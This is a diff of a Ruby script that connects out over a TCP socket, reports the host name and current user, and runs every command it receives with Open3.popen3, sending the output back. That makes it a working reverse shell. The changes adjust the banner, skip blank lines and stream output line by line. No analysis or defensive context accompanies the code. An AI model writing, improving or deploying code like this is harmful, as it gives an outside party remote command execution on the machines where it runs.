@@ -9,16 +9,20 @@ s = TCPSocket.open(hostname, port)
 output_hostname = `hostname`
 output_username = `whoami`
 
-s.puts("Welcome to #{output_hostname}You are logged in as #{output_username}Run close to exit properly\n")
+s.puts("\n\nWelcome to #{output_hostname}You are logged in as #{output_username}Run close to exit properly\n\n")
        
 while (true)
-  line = s.gets.chomp
-  if line == 'close'
+  line = s.gets
+  if line.chomp == ''
+    next
+  elsif line.chomp == 'close'
     s.close
     break
-  end
-  Open3.popen3(line) do |stdin, stdout, stderr, wait_thr|
-    s.puts(stdout.read,stderr.read)
+  else
+    Open3.popen3(line) do |stdin, stdout, stderr, wait_thr|
+      while line = stderr.gets or line = stdout.gets
+        s.puts line
+      end
+    end
   end
 end
-s.close
